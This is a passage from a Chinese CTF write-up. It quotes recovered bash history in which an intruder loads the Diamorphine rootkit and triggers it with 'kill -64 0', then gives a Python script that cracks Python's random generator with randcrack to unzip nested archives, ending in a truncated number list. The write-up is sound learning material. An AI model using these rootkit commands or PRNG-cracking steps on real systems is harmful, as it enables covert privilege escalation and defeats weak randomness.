class="string">-20</span> 14:42:56 UTC<span class="string">+0000</span>   cd tmp/</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:56 UTC<span class="string">+0000</span>   ls</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:04 UTC<span class="string">+0000</span>   sudo insmod diamorphine.ko </span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:31 UTC<span class="string">+0000</span>   kill <span class="string">-64</span> 0</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:33 UTC<span class="string">+0000</span>   whoami</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:43:34 UTC<span class="string">+0000</span>   ls</span><br></pre></td></tr></table></figure>

<p>发现加载了一个内核模块，然后还把编译的文件夹删了。但是可以看出来这个diamorphine.ko应该在tmp文件夹下所以他才会直接在tmp下insmod.</p>
<p>复制文件系统到本地：</p>
<p>volatility -f ./misc_backdoor.vmem  –profile=LinuxUbuntu_4_4_0-87-generic_profilex64 linux_recover_filesystem -D ./</p>
<p>然后把虚拟机里的/tmp下的次rootkit恶意文件拿出来，ida64一下，字符串直接由flag:</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1629770630779.png" alt="1629770630779"></p>
<h2 id="0x04-prophet"><a href="#0x04-prophet" class="headerlink" title="0x04 prophet"></a>0x04 prophet</h2><p>一个靠预测随机数确定下一个zip包解压密码不断解压的题，脚本循环获取名字解压下一个zip。但是只给1000个。</p>
<p>这个最初不知道该怎么做到随机数预测，就查prophet，结果有这个包，然后直接误入歧途了。。。研究了半天没发现这库能做这题的随机数预测。。。后来看大佬博客是randcrack库。</p>
<p>这个库github上可以找到说明和例子，<a target="_blank" rel="noopener" href="https://github.com/tna0y/Python-random-module-cracker">https://github.com/tna0y/Python-random-module-cracker</a></p>
<p>主要就是创建对象后用submit函数吞入，总共能吞624个，满了就进不去了，所以每次拿倒数624个做下一个随机数预测，以此类推。每次出来的都是unknown.zip，改个名继续解。又解了1000次出现flag文件。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-<span class="number">8</span></span><br><span class="line">#python3</span><br><span class="line">#set <span class="number">2907706324</span>.zip in ./</span><br><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">from randcrack import RandCrack</span><br><span class="line"></span><br><span class="line">def getname():</span><br><span class="line">    l = os.listdir()</span><br><span class="line">    for i in l:</span><br><span class="line">        if &quot;.zip&quot; in i and &quot;unknown&quot; not in i:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def randcrack(nums):</span><br><span class="line">    # need <span class="number">624</span> nums</span><br><span class="line">    #submitting <span class="number">624</span> integers it won&#x27;t take any more and will be ready for predicting new numbers.</span><br><span class="line">    #while it is full,it will not swallow in a new one,we should restart.</span><br><span class="line">    rc = RandCrack()</span><br><span class="line">    for i in range(<span class="number">624</span>):</span><br><span class="line">        num = nums[i]</span><br><span class="line">        rc.submit(num)</span><br><span class="line">    predict = rc.predict_randrange(<span class="number">0</span>,<span class="number">4294967295</span>)</span><br><span class="line">    return str(predict)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">names = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># <span class="number">1000</span> nums get</span><br><span class="line">file = open(&#x27;data.txt&#x27;,&#x27;a+&#x27;) </span><br><span class="line">while count != <span class="number">1000</span>:</span><br><span class="line">    name = getname()</span><br><span class="line">    if name:</span><br><span class="line">        zip_file = zipfile.ZipFile(name)</span><br><span class="line">        zip_list = zip_file.namelist()</span><br><span class="line">        for f in zip_list:</span><br><span class="line">            zip_file.extract(f, r&#x27;./&#x27;, pwd=name[:-<span class="number">4</span>].encode(&quot;utf-<span class="number">8</span>&quot;))  # 循环解压文件到指定目录</span><br><span class="line">        zip_file.close()  # 关闭文件，必须有，释放内存</span><br><span class="line">        names.append(int(name[:-<span class="number">4</span>]))</span><br><span class="line">        os.remove(name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        file.write(name[:-<span class="number">4</span>])</span><br><span class="line">        file.write(&#x27;,&#x27;)</span><br><span class="line">        print(&quot;count = &quot;,count,&quot;name = &quot;,name[:-<span class="number">4</span>],&quot;hex = &quot;,hex(int(name[:-<span class="number">4</span>])))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;end or something wrong&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#start unknown.zip</span><br><span class="line">nums = [<span class="number">2907706324</span>,<span class="number">3954914986</span>,<span class="number">3402108112</span>,<span class="number">2054213659</span>,<span class="number">535557466</span>,<span class="number">3669544554</span>,<span class="number">2651712950</span>,<span class="number">3417770286</span>,<span class="number">4111425735</span>,<span class="number">3450915372</span>,<span class="number">3509237967</span>,<span class="number">2707743668</span>,<span class="number">889955106</span>,<span class="number">101861478</span>,<span class="number">1336215387</span>,<span class="number">3605515990</span>,<span class="number">2504989551</span>,<span class="number">1349201253</span>,<span class="number">2648082710</span>,<span class="number">2601629531</span>,<span class="number">318049225</span>,<span class="number">645746114</span>,<span class="number">3181236701</span>,<span class="number">1354915347</span>,<span class="number">4222461704</span>,<span class="number">843752451</span>,<span class="number">304987850</span>,<span class="number">818779778</span>,<span class="number">2376864436</span>,<span class="number">4258684562</span>,<span class="number">3790514089</span>,<span class="number">2536866185</span>,<span class="number">3429670676</span>,<span class="number">700863894</span>,<span class="number">2368789662</span>,<span class="number">2954948787</span>,<span class="number">1850501693</span>,<span class="number">1935300318</span>,<span class="number">4294954886</span>,<span class="number">73605939</span>,<span class="number">790901430</span>,<span class="number">3142640071</span>,<span class="number">3691984007</span>,<span class="number">1373060993</span>,<span class="number">903416285</span>,<span class="number">3121969731</span>,<span class="number">1482630290</span>,<span class="number">3383153547</span>,<span class="number">4063302022</span>,<span class="number">3991027797</span>,<span class="number">4137420745</span>,<span class="number">3132346033</span>,<span class="number">1308129484</span>,<span class="number">3547926414</span>,<span class="number">3109764388</span>,<span class="number">708591644</span>,<span class="number">1817081225</span>,<span class="number">2668947004</span>,<span class="number">4263919904</span>,<span class="number">1115482359</span>,<span class="number">3856868064</span>,<span class="number">2830700281</span>,<span class="number">2281684679</span>,<span class="number">690656972</span>,<span class="number">1556659173</span>,<span class="number">3404632260</span>,<span class="number">3760484167</span>,<span class="number">1087153620</span>,<span class="number">4194906349</span>,<span class="number">1078862195</span>,<span class="number">2976233215</span>,<span class="number">1912726912</span>,<span class="number">30407312</span>,<span class="number">3942988489</span>,<span class="number">3908451981</span>,<span class="number">3898279239</span>,<span class="number">3281283879</span>,<span class="number">3497758064</span>,<span class="number">2782905320</span>,<span class="number">2430005846</span>,<span class="number">2035396750</span>,<span class="number">4225190092</span>,<span class="number">2269868098</span>,<span class="number">3586253265</span>,<span class="number">941460198</span>,<span class="number">714278381</span>,<span class="number">3535781796</span>,<span class="number">224084415</span>,<span class="number">1439629664</span>,<span class="number">4073938538</span>,<span class="number">3695945333</span>,<span class="number">3790821082</span>,<span class="number">1641312648</span>,<span class="number">3482321608</span>,<span class="number">3915303085</span>,<span class="number">1915159805</span>,<span class="number">3430976961</span>,<span class="number">1840044358</span>,<span class="number">3171835875</span>,<span class="number">2774047027</span>,<span class="number">1987332515</span>,<span class="number">3855846206</span>,<span class="number">2973653262</span>,<span class="number">3838867780</span>,<span class="number">611114104</span>,<span class="number">226329481</span>,<span class="number">1915513324</span>,<span class="number">3700256481</span>,<span class="number">43035897</span>,<span class="number">497049019</span>,<span class="number">4217044844</span>,<span class="number">2614275824</span>,<span class="number">744712097</span>,<span class="number">182795116</span>,<span class="number">2163976688</span>,<span class="number">4263470614</span>,<span class="number">725414906</span>,<span class="number">921626470</span>,<span class="number">3746191361</span>,<span class="number">1308296962</span>,<span class="number">1147642242</span>,<span class="number">4092217985</span>,<span class="number">3542284802</span>,<span class="number">1521845264</span>,<span class="number">2075371081</span>,<span class="number">816611597</span>,<span class="number">3041634562</span>,<span class="number">233907246</span>,<span class="number">1795167862</span>,<span class="number">3915308548</span>,<span class="number">491352142</span>,<span class="number">930583074</span>,<span class="number">1708980296</span>,<span class="number">308506013</span>,<span class="number">3810969309</span>,<span class="number">3157296753</span>,<span class="number">2967229333</span>,<span class="number">1571219325</span>,<span class="number">1291393249</span>,<span class="number">1593315655</span>,<span class="number">3882964486</span>,<span class="number">1017041435</span>,<span class="number">1857378099</span>,<span class="number">1824352034</span>,<span class="number">3349753470</span>,<span class="number">674061228</span>,<span class="number">1009504030</span>,<span class="number">2542637984</span>,<span class="number">371165771</span>,<span class="number">2479782679</span>,<span class="number">1480344967</span>,<span class="number">2869593526</span>,<span class="number">1330829984</span>,<span class="number">2722781682</span>,<span class="number">283801038</span>,<span class="number">3707346602</span>,<span class="number">4001933200</span>,<span class="number">2349491114</span>,<span class="number">1250027640</span>,<span class="number">1970245425</span>,<span class="number">171593507</span>,<span class="number">826464228</span>,<span class="number">2984624889</span>,<span class="number">1700335730</span>,<span class="number">1127890176</span>,<span class="number">2298521410</span>,<span class="number">3038015291</span>,<span class="number">3114969709</span>,<span class="number">2198496951</span>,<span class="number">3020449005</span>,<span class="number">2670289699</span>,<span class="number">1384619269</span>,<span class="number">691171966</span>,<span class="number">3223611927</span>,<span class="number">2151567537</span>,<span class="number">1625186327</span>,<span class="number">2435311123</span>,<span class="number">3729455475</span>,<span class="number">2620432733</span>,<span class="number">3211878875</span>,<span class="number">241902387</span>,<span class="number">422789850</span>,<span class="number">1633356868</span>,<span class="number">244191996</span>,<span class="number">499735365</span>,<span class="number">764962662</span>,<span class="number">1681584826</span>,<span class="number">427035682</span>,<span class="number">880783233</span>,<span class="number">1389830348</span>,<span class="number">1256307054</span>,<span class="number">1454192222</span>,<span class="number">3867551829</span>,<span class="number">1911723809</span>,<span class="number">394921086</span>,<span class="number">1072555848</span>,<span class="number">3834541849</span>,<span class="number">2720240412</span>,<span class="number">4083254853</span>,<span class="number">1463684341</span>,<span class="number">2807310132</span>,<span class="number">3989708760</span>,<span class="number">4287462606</span>,<span class="number">4065391879</span>,<span class="number">2946216593</span>,<span class="number">4274887668</span>,<span class="number">960363676</span>,<span class="number">3337566213</span>,<span class="number">2138750961</span>,<span class="number">3655949854</span>,<span class="number">138734513</span>,<span class="number">128284098</span>,<span class="number">1062990215</span>,<span class="number">3761988182</span>,<span class="number">1513533102</span>,<span class="number">845839023</span>,<span class="number">1734162676</span>,<span class="number">3029907057</span>,<span class="number">3437833787</span>,<span class="number">3858879164</span>,<span class="number">2270111112</span>,<span class="number">1830381909</span>,<span class="number">1534981723</span>,<span class="number">622364075</span>,<span class="number">2734894006</span>,<span class="number">3830057679</span>,<span class="number">550477468</span>,<span class="number">2555713963</span>,<span class="number">2687705967</span>,<span class="number">397294684</span>,<span class="number">3910881510</span>,<span class="number">3725223603</span>,<span class="number">2429728499</span>,<span class="number">1711990756</span>,<span class="number">4237787834</span>,<span class="number">2814436797</span>,<span class="number">2366793701</span>,<span class="number">868414597</span>,<span class="number">2185265697</span>,<span class="number">4003527750</span>,<span class="number">510159467</span>,<span class="number">281768698</span>,<span class="number">2839069975</span>,<span class="number">414584629</span>,<span class="number">841160842</span>,<span class="number">2248608666</span>,<span class="number">3581589648</span>,<span class="number">3224270545</span>,<span class="number">2113148121</span>,<span class="number">1552518857</span>,<span class="number">3606499351</span>,<span class="number">3204575349</span>,<span class="number">1595467803</span>,<span class="number">2880744010</span>,<span class="number">1317665514</span>,<span class="number">3437941254</span>,<span class="number">110923457</span>,<span class="number">278638319</span>,<span class="number">2683805720</span>,<span class="number">2816402957</span>,<span class="number">2117760685</span>,<span class="number">4054884851</span>,<span class="number">760362861</span>,<span class="number">2010439063</span>,<span class="number">3484464314</span>,<span class="number">302788119</span>,<span class="number">1394375925</span>,<span class="number">3571572324</span>,<span class="number">2666609477</span>,<span class="number">1853851652</span>,<span class="number">3970831431</span>,<span class="number">2738683685</span>,<span class="number">2259326865</span>,<span class="number">3704336022</span>,<span class="number">1519256231</span>,<span class="number">3644881529</span>,<span class="number">104403453</span>,<span class="number">1142252920</span>,<span class="number">2572082756</span>,<span class="number">2489933602</span>,<span class="number">2709723501</span>,<span class="number">186737154</span>,<span class="number">980884132</span>,<span class="number">1865172639</span>,<span class="number">2329728320</span>,<span class="number">3876911386</span>,<span class="number">3201931453</span>,<span class="number">2772783460</span>,<span class="number">661942251</span>,<span class="number">2402901175</span>,<span class="number">3570219339</span>,<span class="number">549076455</span>,<span class="number">1690874019</span>,<span class="number">2055566646</span>,<span class="number">2662268000</span>,<span class="number">4183765260</span>,<span class="number">1452482414</span>,<span class="number">2583855929</span>,<span class="number">948034686</span>,<span class="number">2853630447</span>,<span class="number">664902618</span>,<span class="number">2764279019</span>,<span class="number">740228037</span>,<span class="number">679334472</span>,<span class="number">1068533991</span>,<span class="number">1825024640</span>,<span class="number">105521362</span>,<span class="number">2758306319</span>,<span class="number">1561107818</span>,<span class="number">2855860411</span>,<span class="number">3944090887</span>,<span class="number">1155572417</span>,<span class="number">2222936476</span>,<span class="number">2982018743</span>,<span class="number">3826797015</span>,<span class="number">993277428</span>,<span class="number">3606014829</span>,<span class="number">2651099474</span>,<span class="number">183026480</span>,<span class="number">3850093664</span>,<span class="number">1946575336</span>,<span class="number">1458018383</span>,<span class="number">919408507</span>,<span class="number">3035932662</span>,<span class="number">666805284</span>,<span class="number">2368179406</span>,<span class="number">293503818</span>,<span class="number">306642195</span>,<span class="number">1174454622</span>,<span class="number">147082512</span>,<span class="number">3045274465</span>,<span class="number">1118557200</span>,<span class="number">2280283457</span>,<span class="number">1140154721</span>,<span class="number">1589304916</span>,<span class="number">2707734613</span>,<span class="number">2687607369</span>,<span class="number">3181595711</span>,<span class="number">1786880670</span>,<span class="number">614492265</span>,<span class="number">1727186681</span>,<span class="number">616992393</span>,<span class="number">2647336831</span>,<span class="number">1328574427</span>,<span class="number">3419233391</span>,<span class="number">86915267</span>,<span class="number">791316613</span>,<span class="number">2947942465</span>,<span class="number">1207262633</span>,<span class="number">4032471359</span>,<span class="number">110173792</span>,<span class="number">580028332</span>,<span class="number">3200100754</span>,<span class="number">1443892133</span>,<span class="number">4158469394</span>,<span class="number">2866259043</span>,<span class="number">1777066304</span>,<span class="number">2631121839</span>,<span class="number">3066797076</span>,<span class="number">913793049</span>,<span class="number">500723146</span>,<span class="number">4250565153</span>,<span class="number">3140000049</span>,<span class="number">4006124671</span>,<span class="number">1557687908</span>,<span class="number">3097026744</span>,<span class="number">1600577917</span>,<span class="number">3475167182</span>,<span class="number">4190641526</span>,<span class="number">1975505102</span>,<span class="number">2746146674</span>,<span class="number">4183482895</span>,<span class="number">3942160073</span>,<span class="number">1130897678</span>,<span class="number">655001677</span>,<span class="number">1503469355</span>,<span class="number">1589952677</span>,<span class="number">289068625</span>,<span class="number">404635291</span>,<span class="number">546675708</span>,<span class="number">4243969683</span>,<span class="number">92985514</span>,<span class="number">435955479</span>,<span class="number">2070686379</span>,<span class="number">269130310</span>,<span class="number">2458267416</span>,<span class="number">230795995</span>,<span class="number">2268807924</span>,<span class="number">4152347460</span>,<span class="number">883606733</span>,<span class="number">3649663604</span>,<span class="number">1939496305</span>,<span class="number">3144082131</span>,<span class="number">1020316188</span>,<span class="number">3643489526</span>,<span class="number">991785797</span>,<span class="number">2377699574</span>,<span class="number">1064114897</span>,<span class="number">3925872718</span>,<span class="number">3153908492</span>,<span class="number">3402689587</span>,<span class="number">729363836</span>,<span class="number">3146706653</span>,<span class="number">422102318</span>,<span class="number">781824325</span>,<span class="number">2070158255</span>,<span class="number">3452344097</span>,<span class="number">1855915077</span>,<span class="number">278758154</span>,<span class="number">2809776511</span>,<span class="number">3655551017</span>,<span class="number">1427426112</span>,<span class="number">3686861685</span>,<span class="number">1715461553</span>,<span class="number">3169333119</span>,<span class="number">400766497</span>,<span class="number">849152388</span>,<span class="number">3842058653</span>,<span class="number">3324504004</span>,<span class="number">2110816760</span>,<span class="number">1993886168</span>,<span class="number">2469709606</span>,<span class="number">1634363898</span>,<span class="number">451167479</span>,<span class="number">1791892046</span>,<span class="number">3639050937</span>,<span class="number">3326490342</span>,<span class="number">3138524672</span>,<span class="number">3683265170</span>,<span class="number">1733092879</span>,<span class="number">3943402096</span>,<span class="number">3178043886</span>,<span class="number">3263958674</span>,<span class="number">2945303049</span>,<span class="number">4030290823</span>,<span class="number">3890019934</span>,<span class="number">4072034359</span>,<span class="number">1491936406</span>,<span class="number">61358117</span>,<span class="number">3877008624</span>,<span class="number">4128962903</span>,<span class="number">3153897248</span>,<span class="number">2029311561</span>,<span class="number">1711005874</span>,<span class="number">1555958789</span>,<span class="number">2460011603</span>,<span class="number">1480475039</span>,<span class="number">2029023339</span>,<span class="number">3898772821</span>,<span class="number">813779337</span>,<span class="number">3274928705</span>,<span class="number">122738867</span>,<span class="number">326424966</span>,<span class="number">2636370832</span>,<span class="number">3504714095</span>,<span class="number">4243999766</span>,<span class="number">2552626959</span>,<span class="number">1698341626</span>,<span class="number">1110935776</span>,<span class="number">3393273826</span>,<span class="number">3735680822</span>,<span class="number">3013017650</span>,<span class="number">3968600483</span>,<span class="number">3916227526</span>,<span class="number">4062882707</span>,<span class="number">4124072198</span>,<span class="number">2274124478</span>,<span class="number">2769833441</span>,<span class="number">2147761328</span>,<span class="number">3979664881</span>,<span class="number">591506957</span>,<span class="number">1000835552</span>,<span class="number">1953837853</span>,<span class="number">3630957255</span>,<span class="number">1526381419</span>,<span class="number">1320001636</span>,<span class="number">804577210</span>,<span class="number">2780887882</span>,<span class="number">57522122</span>,<span class="number">2034965857</span>,<span class="number">1092740256</span>,<span class="number">3343601480</span>,<span class="number">316588755</span>,<span class="number">856922510</span>,<span class="number">3000844043</span>,<span class="number">277993279</span>,<span class="number">2628947374</span>,<span class="number">2800837999</span>,<span class="number">3540281314</span>,<span class="number">1131935058</span>,<span class="number">2554699772</span>,<span class="number">2983012006</span>,<span class="number">3462033745</span>,<span class="number">3747092723</span>,<span class="number">2082631046</span>,<span class="number">1249369550</span>,<span class="number">1399656050</span>,<span class="number">1380244778</span>,<span class="number">3654315687</span>,<span class="number">30864042</span>,<span class="number">3601038453</span>,<span class="number">1812382865</span>,<span class="number">3977191364</span>,<span class="number">3375851263</span>,<span class="number">2615653275</span>,<span class="number">4121914158</span>,<span class="number">4067727195</span>,<span class="number">4215992615</span>,<span class="number">50813272</span>,<span class="number">3422137608</span>,<span class="number">1214655257</span>,<span class="number">2262352860</span>,<span class="number">1445338275</span>,<span class="number">1049642872</span>,<span class="number">817141685</span>,<span class="number">3537094077</span>,<span class="number">1735027729</span>,<span class="number">4235889837</span>,<span class="number">2173890300</span>,<span class="number">4024475021</span>,<span class="number">435474311</span>,<span class="number">417920911</span>,<span class="number">2752551821</span>,<span class="number">10146419</span>,<span class="number">1584825302</span>,<span class="number">2581381951</span>,<span class="number">4078884446</span>,<span class="number">2091842886</span>,<span class="number">2635154217</span>,<span class="number">1512293963</span>,<span class="number">4240561542</span>,<span class="number">2569831040</span>,<span class="number">3062146866</span>,<span class="number">2413003376</span>,<span class="number">2056726083</span>,<span class="number">137699216</span>,<span class="number">2817513365</span>,<span class="number">847863437</span>,<span class="number">1348716639</span>,<span class="number">264518910</span>,<span class="number">1581262871</span>,<span class="number">3687371459</span>,<span class="number">4081927416</span>,<span class="number">3402250258</span>,<span class="number">1538729417</span>,<span class="number">58632833</span>,<span class="number">418582971</span>,<span class="number">3579226914</span>,<span class="number">1710281441</span>,<span class="number">3968026001</span>,<span class="number">3072229268</span>,<span class="number">3255655022</span>,<span class="number">443028273</span>,<span class="number">1781242768</span>,<span class="number">845963258</span>,<span class="number">1474822808</span>,<span class="number">2287289816</span>,<span class="number">3140795568</span>,<span class="number">647767985</span>,<span class="number">3201933540</span>,<span class="number">3344108747</span>,<span class="number">3156561341</span>,<span class="number">2135178605</span>,<span class="number">3977772423</span>,<span class="number">1091627310</span>,<span class="number">3387469991</span>,<span class="number">3480076167</span>,<span class="number">998455889</span>,<span class="number">3932962822</span>,<span class="number">556790737</span>,<span class="number">3462656387</span>,<span class="number">1354331856</span>,<span class="number">331339457</span>,<span class="number">89589652</span>,<span class="number">2169976628</span>,<span class="number">499723289</span>,<span class="number">4248480190</span>,<span class="number">459434352</span>,<span class="number">1756143408</span>,<span class="number">609517004</span>,<span class="number">1625850533</span>,<span class="number">1055607475</span>,<span class="number">4078436277</span>,<span class="number">178892738</span>,<span class="number">2639443481</span>,<span class="number">1643997964</span>,<span class="number">209795222</span>,<span class="number">4031695509</span>,<span class="number">515771499</span>,<span class="number">3844892252</span>,<span class="number">1509762710</span>,<span class="number">3467911440</span>,<span class="number">2990611802</span>,<span class="number">4108349538</span>,<span class="number">1251780874</span>,<span class="number">1275943948</span>,<span class="number">2750712131</span>,<span class="number">457664709</span>,<span class="number">1234644717</span>,<span class="number">3894274138</span>,<span class="number">779659511</span>,<span class="number">1022790972</span>,<span class="number">3587520181</span>,<span class="number">4114414679</span>,<span class="number">1788862106</span>,<span class="number">784942685</span>,<span class="number">2032827515</span>,<span class="number">97699241</span>,<span class="number">502970796</span>,<span class="number">208621053</span>,<span class="number">618199448</span>,<span class="number">869691038</span>,<span class="number">1315708708</span>,<span class="number">2950393537</span>,<span class="number">316695424</span>,<span class="number">3204417376</span>,<span class="number">2157414925</span>,<span class="number">1986435697</span>,<span class="number">578058463</span>,<span class="number">2226332610</span>,<span class="number">45889470</span>,<span class="number">1939749473</span>,<span class="number">4277520616</span>,<span class="number">716509244</span>,<span class="number">3148642698</span>,<span class="number">2619738742</span>,<span class="number">395812501</span>,<span class="number">2611816764</span>,<span class="number">120484619</span>,<span class="number">3803132111</span>,<span class="number">3028743725</span>,<span class="number">3032307726</span>,<span class="number">3558459801</span>,<span class="number">2286359562</span>,<span class="number">3242070811</span>,<span class="number">2972037405</span>,<span class="number">2409275190</span>,<span class="number">333056311</span>,<span class="number">1628673919</span>,<span class="number">1222753699</span>,<span class="number">3226124314</span>,<span class="number">510049636</span>,<span class="number">1798218781</span>,<span class="number">3286822755</span>,<span class="number">2050136383</span>,<span class="number">363266297</span>,<span class="number">753159469</span>,<span class="number">1339229922</span>,<span class="number">3282010884</span>,<span class="number">3964577747</span>,<span class="number">1183093495</span>,<span class="number">3665656653</span>,<span class="number">1802113568</span>,<span class="number">586211819</span>,<span class="number">1906435982</span>,<span class="number">407943402</span>,<span class="number">3478960696</span>,<span class="number">1221962222</span>,<span class="number">2646386190</span>,<span class="number">2344832406</span>,<span class="number">3568499138</span>,<span class="number">3479343149</span>,<span class="number">1044214259</span>,<span class="number">2255694969</span>,<span class="number">2629616514</span>,<span class="number">3767094630</span>,<span class="number">366310899</span>,<span class="number">2466889679</span>,<span class="number">2533941943</span>,<span class="number">2817371332</span>,<span class="number">478094315</span>,<span class="number">3077780922</span>,<span class="number">1917154805</span>,<span class="number">3668750533</span>,<span class="number">77295478</span>,<span class="number">258422916</span>,<span class="number">3929257613</span>,<span class="number">3653596300</span>,<span class="number">749676172</span>,<span class="number">2250390103</span>,<span class="number">1052624843</span>,<span class="number">2563981631</span>,<span class="number">519704737</span>,<span class="number">2969422268</span>,<span class="number">1628120157</span>,<span class="number">4100859626</span>,<span class="number">252141936</span>,<span class="number">2978131799</span>,<span class="number">1142247725</span>,<span class="number">3804721174</span>,<span class="number">1356078034</span>,<span class="number">1198864435</span>,<span class="number">2564872115</span>,<span class="number">3858385849</span>,<span class="number">3652532995</span>,<span class="number">305266060</span>,<span class="number">482238871</span>,<span class="number">1451662628</span>,<span class="number">2189662472</span>,<span class="number">4225060244</span>,<span class="number">3266478407</span>,<span class="number">298473768</span>,<span class="number">1328477173</span>,<span class="number">1872099590</span>,<span class="number">380059855</span>,<span class="number">912553536</span>,<span class="number">2099522339</span>,<span class="number">3224313555</span>,<span class="number">2056296410</span>,<span class="number">477848639</span>,<span class="number">379190417</span>,<span class="number">3487993484</span>,<span class="number">3121969521</span>,<span class="number">2288925162</span>,<span class="number">3077843604</span>,<span class="number">1456549673</span>,<span class="number">1304340342</span>,<span class="number">2083447579</span>,<span class="number">3167117719</span>,<span class="number">3348095325</span>,<span class="number">2268107766</span>,<span class="number">1402643313</span>,<span class="number">2397212057</span>,<span class="number">1352006746</span>,<span class="number">231921187</span>,<span class="number">1313920238</span>,<span class="number">2168273889</span>,<span class="number">805130323</span>,<span class="number">2816803714</span>,<span class="number">3720840652</span>,<span class="number">3407591957</span>,<span class="number">479785258</span>,<span class="number">1217833088</span>,<span class="number">4229273758</span>,<span class="number">587760181</span>,<span class="number">1233711591</span>,<span class="number">2930015733</span>,<span class="number">3697241657</span>,<span class="number">570349524</span>,<span class="number">1000281623</span>,<span class="number">2960131310</span>,<span class="number">3941057032</span>,<span class="number">3611068081</span>,<span class="number">1929535695</span>,<span class="number">1078174814</span>,<span class="number">549556557</span>,<span class="number">2427930182</span>,<span class="number">1127864687</span>,<span class="number">3728874623</span>,<span class="number">1552852683</span>,<span class="number">246530969</span>,<span class="number">3129577778</span>,<span class="number">2828503428</span>,<span class="number">741919312</span>,<span class="number">215642980</span>,<span class="number">1167747156</span>,<span class="number">1074184265</span>,<span class="number">1803181867</span>,<span class="number">1728287989</span>,<span class="number">3994497806</span>,<span class="number">3166040995</span>,<span class="number">4102870506</span>,<span class="number">2533028438</span>,<span class="number">1554448227</span>,<span class="number">1743174913</span>,<span class="number">2757654175</span>,<span class="number">1620162669</span>,<span class="number">2326525927</span>,<span class="number">1822891531</span>,<span class="number">3118838616</span>,<span class="number">988494514</span>,<span class="number">724274952</span>,<span class="number">3466926668</span>,<span class="number">2858066332</span>,<span class="number">1508595710</span>,<span class="number">2951666140</span>,<span class="number">1637995296</span>,<span class="number">2345022808</span>,<span class="number">4293996946</span>,<span class="number">2531108812</span>,<span class="number">1393641667</span>,<span class="number">3609374661</span>,<span class="number">1294467284</span>,<span class="number">1466747081</span>,<span class="number">1787125071</span>,<span class="number">418589219</span>,<span class="number">2105433503</span>,<span class="number">2486534005</span>,<span class="number">1556969350</span>,<span class="number">4187693157</span>,<span class="number">2376356641</span>,<span class="number">2760842106</span>,<span class="number">3305118691</span>,<span class="number">2311132184</span>,<span class="number">2756948087</span>,<span class="number">3686050208</span>,<span class="number">1794448609</span>,<span class="number">2080775564</span>,<span class="number">2924248445</span>,<span class="number">2178418677</span>,<span class="number">4158669833</span>,<span class="number">3219430073</span>,<span class="number">967669386</span>,<span class="number">221829347</span>,<span class="number">730413000</span>,<span class="number">4032488141</span>,<span class="number">861524009</span>,<span class="number">3520395384</span>,<span class="number">229287210</span>,<span class="number">2928013323</span>,<span class="number">634603946</span>,<span class="number">2344109932</span>,<span class="number">2651517581</span>,<span class="number">2956026520</span>,<span class="number">3962896689</span>,<span class="number">752853056</span>,<span class="number">1576906191</span>,<span class="number">420644394</span>,<span class="number">1259665633</span>,<span class="number">1833948237</span>,<span class="number">1550770827</span>,<span class="number">2065923435</span>,<span class="number">4174111849</span>,<span class="number">3128201235</span>,<span class="number">2682226239</span>,<span class="number">3167161894</span>,<span class="number">576977612</span>,<span class="number">2487367426</span>,<span class="number">2431206872</span>,<span class="number">3390561516</span>,<span class="number">2334384070</span>,<span class="number">3436416734</span>,<span class="number">2200879126</span>,<span class="number">3180692685</span>,<span class="number">2766121590</span>,<span class="number">1064218408</span>,<span class="number">410199199</span>,<span class="number">20022323</span>,<span class="number">1718513066</span>,<span class="number">3297953226</span>,<span class="number">451443686</span>,<span class="number">2132362103</span>,<span class="number">257410781</span>,<span class="number">1541671484</span>,<span class="number">3761895270</span>,<span class="number">348365872</span>,<span class="number">816022713</span>,<span class="number">4294497492</span>,<span class="number">2625738817</span>,<span 